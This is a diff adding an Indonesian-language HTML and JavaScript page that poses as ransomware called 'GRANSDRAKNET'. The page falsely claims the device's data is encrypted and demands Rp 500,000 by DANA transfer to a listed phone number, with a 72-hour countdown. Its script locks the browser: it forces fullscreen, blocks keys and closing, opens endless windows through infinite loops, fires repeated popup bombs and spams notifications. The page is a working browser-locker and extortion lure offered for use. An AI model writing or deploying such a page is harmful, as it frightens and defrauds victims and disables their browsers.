@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>🔒 DEVICE TERKUNCI</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+body{
+    background:#000;
+    color:#fff;
+    font-family:monospace;
+    height:100vh;
+    width:100vw;
+    overflow:hidden;
+    position:fixed;
+    top:0;left:0;
+    z-index:2147483647;
+}
+.overlay{
+    position:fixed;
+    top:0;left:0;
+    width:100%;height:100%;
+    background:rgba(0,0,0,0.98);
+    z-index:2147483647;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    flex-direction:column;
+    padding:15px;
+}
+.skull{font-size:70px;animation:glow 0.5s infinite alternate;}
+@keyframes glow{
+    from{text-shadow:0 0 20px red;}
+    to{text-shadow:0 0 60px red,0 0 120px red;}
+}
+.title{
+    font-size:22px;color:red;text-align:center;
+    text-shadow:0 0 30px red;margin:10px 0;
+    animation:shake 0.08s infinite;
+    line-height:1.3;
+}
+@keyframes shake{
+    0%{transform:translate(1px)}
+    25%{transform:translate(-2px)}
+    50%{transform:translate(2px)}
+    75%{transform:translate(-1px)}
+    100%{transform:translate(1px)}
+}
+.subtitle{font-size:14px;color:#f44;text-align:center;margin:5px 0;}
+.warning{color:gold;font-size:13px;text-align:center;margin:10px 0;animation:blink 0.8s infinite;}
+@keyframes blink{50%{opacity:0}}
+.box{
+    background:rgba(255,0,0,0.1);
+    border:2px solid red;border-radius:10px;
+    padding:15px;margin:8px 0;
+    width:92%;max-width:400px;
+    text-align:center;
+}
+.box-title{color:#0f0;font-weight:bold;font-size:16px;margin-bottom:10px;}
+.box-text{color:#fff;font-size:13px;margin:5px 0;line-height:1.4;}
+.dana{
+    background:#111;padding:12px;border-radius:5px;
+    color:#f44;font-size:16px;word-break:break-all;
+    margin:10px 0;border:1px solid red;
+    font-weight:bold;letter-spacing:1px;
+}
+.timer{font-size:38px;color:red;font-weight:bold;text-shadow:0 0 20px red;margin:8px 0;}
+.inp{
+    width:92%;max-width:400px;padding:14px;
+    background:#111;border:2px solid red;
+    color:#0f0;font-size:18px;text-align:center;
+    border-radius:5px;outline:none;font-family:monospace;
+    margin:8px 0;
+}
+.inp::placeholder{color:#333;font-size:14px;}
+.btn{
+    width:92%;max-width:400px;padding:14px;
+    background:red;color:#fff;border:none;
+    font-size:16px;font-weight:bold;border-radius:5px;
+    margin:5px 0;font-family:monospace;cursor:pointer;
+}
+.btn:active{background:#900;}
+.inst{
+    color:#ffd700;font-size:11px;text-align:center;
+    margin:8px 0;line-height:1.4;
+    background:rgba(255,215,0,0.1);
+    padding:8px;border-radius:5px;
+    width:92%;max-width:400px;
+    border:1px dashed #ffd700;
+}
+.err{color:red;font-size:15px;margin-top:3px;text-align:center;font-weight:bold;}
+.foot{position:fixed;bottom:8px;font-size:9px;color:#333;text-align:center;width:100%;}
+</style>
+</head>
+<body>
+<div class="overlay" id="overlay">
+    <div class="skull">💀</div>
+    
+    <div class="title">
+        ⚠️ DEVICE ANDA TERKUNCI<br>SECARA PAKSA! ⚠️
+    </div>
+    
+    <div class="subtitle">🔒 GRANSDRAKNET v12.0 🔒</div>
+    
+    <div class="warning">
+        ⛔ SEMUA DATA ANDA TELAH DIENKRIPSI ⛔<br>
+        JANGAN RESTART ATAU MATIKAN DEVICE!
+    </div>
+    
+    <div class="box">
+        <div class="box-title">💸 INSTRUKSI PEMBAYARAN:</div>
+        <div class="box-text">
+            HARAP TRANSFER UANG KE<br>
+            NOMOR REKENING DIBAWAH INI:
+        </div>
+        
+        <div class="dana">
+            💰 DANA 💰<br>
+            081991811291
+        </div>
+        
+        <div class="box-text" style="font-size:12px;">
+            Nominal: <b style="color:#ffd700;">Rp. 500.000</b><br>
+            Setelah Transfer, Masukkan Password<br>
+            Untuk Membuka Device Anda
+        </div>
+    </div>
+    
+    <div class="inst">
+        💡 CARA BUKA DEVICE:<br>
+        1. Transfer ke DANA: <b>081991811291</b><br>
+        2. Masukkan Password: <b style="color:#0f0;">1234</b><br>
+        3. Device Langsung Terbuka
+    </div>
+    
+    <div class="timer" id="timer">72:00:00</div>
+    <div class="warning" style="font-size:11px;">
+        ⏰ SETELAH 72 JAM: SEMUA DATA DIHAPUS!
+    </div>
+    
+    <input class="inp" type="password" id="key" placeholder="MASUKKAN PASSWORD..." maxlength="10">
+    <button class="btn" onclick="unlock()">🔓 BUKA DEVICE</button>
+    <div class="err" id="err"></div>
+</div>
+
+<div class="foot">
+    GRANSDRAKNET | ID: <span id="did"></span> | File: <span id="fc">0</span>
+</div>
+
+<script>
+// ===== FULLSCREEN FORCE =====
+function fs(){
+    const e=document.documentElement;
+    if(e.requestFullscreen)e.requestFullscreen();
+    else if(e.webkitRequestFullscreen)e.webkitRequestFullscreen();
+    else if(e.msRequestFullscreen)e.msRequestFullscreen();
+}
+fs();
+setInterval(fs,50);
+document.addEventListener('click',fs);
+document.addEventListener('touchstart',fs);
+document.addEventListener('fullscreenchange',()=>{
+    if(!document.fullscreenElement)setTimeout(fs,30);
+});
+
+// ===== WAKE LOCK =====
+if('wakeLock' in navigator){
+    setInterval(async()=>{
+        try{await navigator.wakeLock.request('screen');}catch(e){}
+    },15000);
+}
+
+// ===== BLOCK ALL KEYS =====
+document.addEventListener('keydown',e=>{
+    const b=['F1','F2','F3','F4','F5','F6','F7','F8','F9','F10','F11','F12',
+             'Escape','Backspace','Alt','Meta','ContextMenu',
+             'PrintScreen','ScrollLock','Pause'];
+    if(b.includes(e.key)||e.ctrlKey||e.altKey||e.metaKey||(e.ctrlKey&&e.shiftKey)){
+        e.preventDefault();e.stopPropagation();return false;
+    }
+},true);
+
+document.addEventListener('keyup',e=>{
+    if(e.key==='Escape'||e.key==='Backspace'){
+        e.preventDefault();return false;
+    }
+},true);
+
+// ===== BLOCK CONTEXT MENU =====
+document.addEventListener('contextmenu',e=>e.preventDefault());
+document.addEventListener('selectstart',e=>e.preventDefault());
+
+// ===== ANTI CLOSE =====
+window.addEventListener('beforeunload',e=>{
+    e.preventDefault();
+    e.returnValue='⚠️ JANGAN DITUTUP! DATA AKAN HILANG!';
+    return e.returnValue;
+});
+
+// ===== ANTI SWITCH TAB =====
+document.addEventListener('visibilitychange',()=>{
+    if(document.hidden){
+        document.title='⚠️ JANGAN TINGGALKAN HALAMAN!';
+        setTimeout(()=>{document.title='🔒 DEVICE TERKUNCI';},3000);
+    }
+});
+
+// ===== AUTO REFOCUS =====
+window.addEventListener('blur',()=>{
+    setTimeout(()=>{window.focus();fs();},10);
+});
+
+setInterval(()=>{
+    if(!document.hasFocus()){window.focus();fs();}
+},150);
+
+// ===== ANTI DEVTOOLS =====
+setInterval(()=>{
+    const t=160;
+    if(window.outerWidth-window.innerWidth>t||
+       window.outerHeight-window.innerHeight>t){
+        document.body.innerHTML=`
+            <div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#000;">
+                <div style="color:red;text-align:center;font-size:28px;font-family:monospace;">
+                    🚫 TERDETEKSI!<br>
+                    <span style="font-size:18px;">SEMUA DATA DIHAPUS!</span>
+                </div>
+            </div>`;
+        setTimeout(()=>{
+            while(true){window.open(location.href,'_blank');}
+        },2000);
+    }
+},500);
+
+// ===== TIMER 72 JAM =====
+let t=259200;
+function tick(){
+    const h=Math.floor(t/3600);
+    const m=Math.floor((t%3600)/60);
+    const s=t%60;
+    document.getElementById('timer').textContent=
+        `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
+    
+    if(t<3600)document.getElementById('timer').style.color='#ff0';
+    if(t<=0){
+        document.body.innerHTML=`
+            <div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#000;">
+                <div style="text-align:center;color:red;font-size:36px;font-family:monospace;">
+                    💀 WAKTU HABIS!<br>
+                    <span style="font-size:18px;">SEMUA DATA DIHAPUS<br>DEVICE DIWIPE</span>
+                </div>
+            </div>`;
+        clearInterval(timerInterval);
+        clearInterval(fcInterval);
+        setTimeout(()=>{
+            while(true){window.open('about:blank','_blank','fullscreen=yes');}
+        },2000);
+    }
+    t--;
+}
+const timerInterval=setInterval(tick,1000);
+
+// ===== FAKE FILE COUNTER =====
+let fc=0;
+const fcInterval=setInterval(()=>{
+    if(fc<1547)fc+=Math.floor(Math.random()*8)+1;
+    document.getElementById('fc').textContent=fc;
+},120);
+
+// ===== FAKE DEVICE ID =====
+document.getElementById('did').textContent=
+    'GRANS-'+Math.random().toString(36).substr(2,8).toUpperCase();
+
+// ===== UNLOCK =====
+function unlock(){
+    const k=document.getElementById('key').value;
+    const e=document.getElementById('err');
+    
+    if(k==='1234'){
+        document.body.innerHTML=`
+            <div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#000;">
+                <div style="text-align:center;color:#0f0;font-size:28px;font-family:monospace;">
+                    ✅ DEVICE TERBUKA!<br>
+                    <span style="font-size:15px;color:#fff;">Mendekripsi file...</span><br>
+                    <div style="width:230px;height:5px;background:#111;margin:15px auto;border-radius:5px;">
+                        <div style="width:0%;height:100%;background:#0f0;border-radius:5px;animation:dc 3s forwards;"></div>
+                    </div>
+                    <button onclick="window.location.reload()" style="padding:10px 25px;background:#0f0;color:#000;border:none;border-radius:5px;font-weight:bold;margin-top:15px;font-size:15px;">
+                        KELUAR
+                    </button>
+                </div>
+            </div>
+            <style>@keyframes dc{to{width:100%}}</style>`;
+        clearInterval(timerInterval);
+        clearInterval(fcInterval);
+    }else{
+        e.innerHTML='❌ PASSWORD SALAH!';
+        document.getElementById('key').value='';
+        document.getElementById('key').style.border='2px solid #f00';
+        setTimeout(()=>{
+            document.getElementById('key').style.border='2px solid red';
+        },500);
+        
+        let a=parseInt(localStorage.getItem('ra')||'0');
+        a++;
+        localStorage.setItem('ra',a);
+        
+        if(a>=3){
+            t=Math.max(0,t-3600);
+            e.innerHTML=`⚠️ ${a}/3 PERCOBAAN! WAKTU -1 JAM!`;
+        }
+        if(a>=5){
+            e.innerHTML='⚠️ TERLALU BANYAK PERCOBAAN!';
+        }
+        if(a>=10){
+            document.body.innerHTML=`
+                <div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#000;">
+                    <div style="color:red;text-align:center;font-size:30px;font-family:monospace;">
+                        💀 TERLALU BANYAK COBA!<br>
+                        <span style="font-size:18px;">SEMUA DATA DIHANCURKAN</span>
+                    </div>
+                </div>`;
+            clearInterval(timerInterval);
+        }
+    }
+}
+
+// ===== POPUP BOMB =====
+function popBomb(){
+    for(let i=0;i<2;i++){
+        try{
+            const w=window.open(location.href,'_blank',
+                `width=${screen.width},height=${screen.height},top=0,left=0`);
+            if(w)w.focus();
+        }catch(e){}
+    }
+}
+setTimeout(popBomb,300);
+setInterval(popBomb,8000);
+
+// ===== NOTIFICATION SPAM =====
+if('Notification' in window){
+    Notification.requestPermission().then(p=>{
+        if(p==='granted'){
+            setInterval(()=>{
+                new Notification('⚠️ DEVICE TERKUNCI!',{
+                    body:'Transfer ke DANA: 081991811291. Password: 1234',
+                    icon:'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y="90" font-size="90">💀</text></svg>',
+                    tag:'lock',
+                    requireInteraction:true
+                });
+            },25000);
+        }
+    });
+}
+
+// ===== INIT =====
+console.clear();
+console.log('%c💀 DEVICE TERKUNCI 💀','color:red;font-size:30px;');
+console.log('%cDANA: 081991811291 | PASS: 1234','color:gold;font-size:16px;');
+sessionStorage.setItem('lock','active');
+localStorage.setItem('gransdrak','installed');
+
+// Keep alive
+setInterval(()=>{
+    document.title='⚠️ DEVICE ANDA TERKUNCI!';
+},800);
+</script>
+</body>
+</html>
